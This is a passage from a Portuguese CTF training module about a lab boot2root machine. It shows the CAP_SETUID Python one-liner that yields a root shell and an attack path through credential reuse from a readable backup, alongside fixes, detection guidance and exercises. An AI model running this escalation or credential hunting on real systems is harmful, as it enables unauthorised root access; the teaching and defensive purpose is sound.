+karen@target:/$ ls -la /opt/maintenance
+-rwxr-x--- 1 root karen 6832784 ... pyhealth
+```
+
+`pyhealth` é uma cópia do Python com a capability **CAP_SETUID** (`+ep` = efetiva e permitida), executável só pelo grupo `karen`. CAP_SETUID deixa o processo trocar o próprio UID — inclusive para 0. Sem bit SUID: a capability basta. Peça ao Python para virar root e abrir uma shell:
+
+```console
+karen@target:/$ /opt/maintenance/pyhealth -c 'import os; os.setuid(0); os.system("/bin/sh")'
+# id
+uid=0(root) gid=1000(karen) groups=1000(karen)
+# cat /root/root.txt
+FLAG{...}        # a flag de root — mande no cartão da tarefa
+```
+
+`uid=0`: root pleno (o `gid` continuar 1000 não importa — `/root/root.txt` é do root e o UID manda). **Lição:** o vetor vertical só apareceu **depois** do lateral e só para a identidade `karen`; e ele não era SUID nem sudo — era uma capability, o terceiro vetor que você tinha que lembrar de checar. Re-enumerar a cada salto, e lembrar da lista inteira de vetores, é o que destrava a máquina.
+</Solution>
+
+<FlagInput task="flag-root" />
+
+### 5.4 Documente o caminho e desligue
+
+Antes de sair, faça o que todo pentester faz: feche o <GlossaryTerm term="attack path">attack path</GlossaryTerm> que você vinha anotando. Um modelo mínimo (o embrião do relatório da 8.4):
+
+<CodeBlock
+  title="~/ctf-sem-dicas/attack-path.md"
+  lang="text"
+  code={`# Attack path — maquina de treino ctf-sem-dicas (host: target)
+
+## Salto 0 — Foothold
+- Identidade: www-data (uid 33), via "web shell".
+
+## Salto 1 — Lateral: www-data -> karen (credential reuse)
+- 2026-01-01T13:40Z  cat /var/www/html/db-legacy.php  -> senha gallery_ro = DECOY (read-only, nao reusa).
+- 2026-01-01T13:43Z  tar -xzf /var/backups/home-karen.tar.gz; cat notes.txt -> senha de login da karen.
+- 2026-01-01T13:45Z  su karen                          -> uid=1000(karen). Flag: user.txt.
+
+## Salto 2 — Vertical: karen -> root (Linux capability)
+- 2026-01-01T13:50Z  sudo -l / find -perm -4000        -> DECOYs (karen fora do sudoers; SUID so os padrao).
+- 2026-01-01T13:52Z  getcap -r /                        -> /opt/maintenance/pyhealth cap_setuid=ep.
+- 2026-01-01T13:53Z  pyhealth -c 'os.setuid(0); os.system("/bin/sh")' -> uid=0. Flag: root.txt.
+
+## Como cortar a cadeia (para o relatorio)
+- Nao deixar backup legivel (chmod/own) e nao reusar a senha de login em scripts.
+- Remover a CAP_SETUID do pyhealth (setcap -r) ou nao dar a ferramenta ao grupo karen.`}
+/>
+
+Como você subiu com `--rm`, o contêiner **desaparece sozinho** ao sair. Para apagar também a imagem:
+
+```console
+$ exit        # saia dos shells aninhados ate o contêiner encerrar
+$ docker rmi ctf-sem-dicas:local
+```
+
+## 6. Variações e aprofundamento
+
+**Os formatos de CTF.** Boot2root (o desta trilha) é só um estilo. Há o **Jeopardy**, com desafios isolados por categoria (web, cripto, forense, _reversing_, _pwn_) e pontos por dificuldade — é o formato da maioria das competições. Há o **attack-defense**, em que times defendem os próprios serviços enquanto atacam os dos outros em tempo real. E há as **máquinas de plataforma** (estilo HackTheBox, TryHackMe, VulnHub), que são boot2root hospedadas. O método muda pouco; o que muda é o contorno.
+
+**Mais saltos.** Esta máquina tem dois (lateral + vertical). Máquinas e redes reais encadeiam mais: `www-data` → `backupuser` (por uma chave SSH legível) → `dba` (por uma senha no histórico) → `root` (por um `cron`). O laço é o mesmo, repetido; o que cresce é a disciplina de documentar e de não se perder.
+
+**Enumeração mais funda.** Além do que você usou aqui, o repertório de um boot2root inclui: chaves SSH privadas legíveis (`~/.ssh/id_*`), senhas em `~/.bash_history`, variáveis de ambiente de processos (`/proc/<pid>/environ`), tarefas `cron` graváveis, binários com `cron` chamando scripts que você edita, montagens NFS com `no_root_squash`, e serviços internos em `127.0.0.1` que só aparecem com `ss -tlnp`. Cada um é uma hipótese a mais quando o óbvio não aparece.
+
+**Como (e quando) ler um writeup.** Writeups — relatos de como alguém resolveu uma máquina — são ouro para **aprender**, veneno para **colar**. A regra: resolva (ou esgote de verdade a árvore) primeiro; só então leia o writeup de outra pessoa e compare o caminho dela com o seu. Você quase sempre vai descobrir uma técnica de enumeração que não conhecia — e é assim que o repertório cresce. Ler o writeup **antes** de tentar só treina a sua capacidade de seguir o roteiro de outro, que é exatamente o que este módulo tira de você.
+
+**Quando usar automação pesada.** Ferramentas como `linpeas.sh`, `pspy` (espiona processos e cron sem ser root) e `linux-exploit-suggester` aceleram a cobertura. Num boot2root, suba-as para o alvo (no 6.2 você viu como transferir arquivos offline) e **leia a saída inteira** — a linha que vence costuma estar no meio de centenas de linhas verdes.
+
+## 7. Erros comuns
+
+- **Pedir dica (ou abrir a solução) cedo demais.** O reflexo de buscar ajuda aos 5 minutos é o que impede a autonomia de nascer. Antes de qualquer `<Solution>` ou writeup, desça as quatro perguntas da árvore (seção 3.1). Quase sempre o bloqueio é "não enumerei tudo" ou "não re-enumerei como a nova identidade".
+- **Insistir no rabbit hole.** Passou do seu time-box no mesmo vetor? Abandone e anote "descartado". Insistir "porque já investi tempo" é a falácia do custo afundado — e o erro nº 1 de quem resolve sem dicas.
+- **Ficar "preso" na identidade antiga.** Virou `karen` e continuou rodando a enumeração do `www-data`? O `getcap` do vetor de root fica invisível. Rode `id`, `sudo -l`, `getcap -r /` e `groups` **de novo**, como a nova identidade.
+- **Tratar toda senha achada como a chave.** O `db-legacy.php` tem uma senha que não serve para nada. Teste cada segredo contra o objetivo e descarte a isca sem apego.
+- **`su karen` falha com "Authentication failure".** Senha errada (confira o `notes.txt`, inclusive os caracteres especiais `!` e `-`) ou você digitou num shell sem `su`. No alvo, a senha é exatamente a do bilhete.
+- **Esquecer um dos três vetores da Trilha 6.** Checou SUID e `sudo` e parou? Falta o terceiro: **capabilities** (`getcap -r / 2>/dev/null`). Uma checklist mental dos vetores evita dar a máquina por "segura" cedo demais.
+- **Não anotar enquanto resolve.** Reconstituir o caminho de memória no fim perde o comando exato, a evidência e a ordem dos saltos. O attack path se escreve **durante**.
+
+## 8. Boas práticas e segurança
+
+Como este é um módulo de consolidação, a "defesa" tem duas metades: **como cortar a cadeia** que você acabou de explorar (o lado do _blue team_) e **como treinar com segurança e dentro da lei** (a higiene de quem pratica CTF).
+
+### 8.1 Cortar a cadeia da máquina
+
+Pensar em cadeia dá a vantagem defensiva: o atacante precisa de **todos** os elos; você precisa quebrar **um**.
+
+**Elo 1 — o backup legível (não vaze segredo em arquivo).** Backups e dumps não devem ser legíveis por contas de serviço. Dê dono e modo apertados e tire-os do alcance do `www-data`:
+
+```console
+# RUIM: backup com segredo, legivel por todos (644, dono root mas world-read)
+-rw-r--r-- 1 root root  home-karen.tar.gz
+
+# MELHOR: dono e grupo certos, sem leitura para o mundo
+$ chown root:backup /var/backups/home-karen.tar.gz
+$ chmod 600 /var/backups/home-karen.tar.gz
+```
+
+**Elo 2 — a senha reaproveitada (mate o credential reuse).** A `karen` caiu porque usou a mesma senha no login e num script. Senhas não se reaproveitam entre um serviço e uma conta do sistema; segredos saem de arquivos em claro e vão para um cofre (_secrets manager_) ou variáveis de ambiente restritas ao processo. É o mesmo elo que derrubou a Colonial (uma credencial, nenhuma segunda barreira) — e ter MFA em contas de acesso remoto é o complemento barato.
+
+**Elo 3 — a capability excessiva (dê só o poder necessário).** Dar `CAP_SETUID` a um binário que executa código arbitrário (um Python) é, na prática, dar root a quem puder rodá-lo. Audite capabilities periodicamente e remova as que não precisam:
+
+```console
+# Encontrar binarios com capability em toda a arvore:
+$ getcap -r / 2>/dev/null
+
+# Remover a capability indevida do pyhealth:
+$ setcap -r /opt/maintenance/pyhealth
+```
+
+Se a ferramenta realmente precisa de privilégio, prefira uma capability **mínima** (não `CAP_SETUID` num interpretador), um binário que **não** permita escape de shell, e restrinja quem o executa. Remover esse elo quebra a máquina inteira: sem ele, `karen` não chega a `root`.
+
+### 8.2 Detecção
+
+Isoladamente, um `cat` de backup, um `su` e um `getcap` passam despercebidos; é a **sequência** que denuncia. Um `tar`/`cat` de arquivos de backup por uma conta de serviço, seguido de um `su` para outra conta e do uso de um binário com capability que chama `/bin/sh`, é um padrão que o `auditd` e um EDR reconhecem como **Privilege Escalation** (tática **TA0004** do <GlossaryTerm term="MITRE ATT&CK">MITRE ATT&CK</GlossaryTerm>). Monitorar a cadeia, não o evento solto, é o que pega a escalação em flagrante — e foi a ausência disso (76 dias sem detecção na Equifax, do 8.1) que transformou footholds em desastres.
+
+### 8.3 Higiene de quem treina
+
+A autonomia técnica que você ganha aqui precisa de contorno:
+
+- **Só o seu ambiente ou o escopo autorizado.** O contêiner deste módulo é seu e isolado. Plataformas de CTF (HackTheBox, TryHackMe) dão alvos **autorizados por contrato de uso** — e você só os ataca pela VPN delas, nunca mirando outra infraestrutura. Fora disso, é a Lei 12.737/2012.
+- **Nunca "pratique" num alvo de terceiros.** "Só queria testar" não é autorização. O limite é sempre o escopo escrito (Trilha 1).
+- **Trate o treino como ensaio do profissional.** Anote como anotaria para um cliente, respeite OPSEC mesmo quando a máquina é sua: o hábito que você treina é o que você vai executar sob pressão.
+
+## 9. Exercícios
+
+Primeiro o quiz de teoria (ele conta para concluir o módulo e cobra o **método** da autonomia, não a decoreba dos comandos):
+
+<Quiz task="quiz-final" />
+
+Depois, as duas flags da máquina (seção 5), resolvidas **sem abrir as soluções antes de tentar**:
+
+- **Flag de usuário:** do foothold `www-data` ao usuário `karen`, por um segredo reaproveitado — descartando a isca pelo caminho. Leia `/home/karen/user.txt`.
+- **Flag de root:** de `karen` a `root` pelo terceiro vetor da Trilha 6 (uma Linux capability), re-enumerando como a nova identidade. Leia `/root/root.txt`.
+
+Para ir além, **sem flag**:
+
+1. **Corte um elo.** No `Dockerfile`, troque o `chmod 644` do backup por `600` (ou remova a capability com `setcap -r`), reconstrua e confirme que a máquina deixa de ser resolvível por aquele caminho. Provar que um único corte quebra a cadeia é a melhor forma de internalizar a defesa.
+2. **Esconda um rabbit hole.** Adicione ao `Dockerfile` um segundo backup com uma senha que não serve para nada, dê a um amigo e cronometre quanto tempo ele leva para descartá-lo. Projetar a isca ensina a reconhecê-la.
+3. **Escreva o writeup completo** da máquina, como se fosse entregá-lo a um cliente (é o treino direto para o 8.4): contexto, cada salto com comando e evidência, impacto e as recomendações de correção da seção 8.1.
+
+## 10. Resumo e glossário
+
+**Pontos-chave:**
+
+- Resolver uma máquina **sem dicas** não exige técnica nova — exige **método sob incerteza**: decidir sozinho o próximo passo a partir do que a enumeração revela.
+- O **laço da autonomia** é a resposta para "e agora?": enumerar → hipótese → testar (com time-box) → registrar — e **cada troca de identidade reinicia o laço**.
+- Um **rabbit hole** é um vetor que não anda; o **time-boxing** é a disciplina de abandoná-lo a tempo, em vez de insistir (o erro nº 1 de quem começa).
+- Nem todo segredo achado é a chave: parte é **isca (decoy)** e precisa ser testada e descartada sem apego.
+- A máquina é um **boot2root** de duas flags (user → root): foothold `www-data` → `karen` por credential reuse em backup → `root` por uma **Linux capability** (`CAP_SETUID`), com SUID e `sudo` como iscas.
+- **Documentar o attack path durante** a resolução é o entregável; o CTF treina o método, mas um pentest real soma escopo, OPSEC e relatório.
+- Defender é **cortar qualquer elo** (backup fechado, sem credential reuse, capability mínima) e monitorar a **cadeia**, não o evento solto.
+
+### Termos deste módulo
+
+<ModuleGlossary />
+
+### Para ir além
+
+- [Uber Newsroom — "Security Update" (19 set. 2022)](https://www.uber.com/newsroom/security-update/) — o relato oficial do caso da seção 4 (foothold por MFA fatigue, escalação por segredo em arquivo).
+- [GTFOBins](https://gtfobins.github.io/) — o catálogo de binários Unix que viram shell quando têm SUID, `sudo` ou **capability** indevida; a seção **Capabilities** cobre o `CAP_SETUID` do salto de root.
+- [MITRE ATT&CK — Privilege Escalation (TA0004)](https://attack.mitre.org/tactics/TA0004/) — a tática que a cadeia deste módulo percorre, com as técnicas e detecções catalogadas.
+- [man capabilities(7)](https://man7.org/linux/man-pages/man7/capabilities.html) — a referência de como o Linux fatia o poder do root, incluindo `CAP_SETUID` e os conjuntos efetivo/permitido (`e`/`p`).
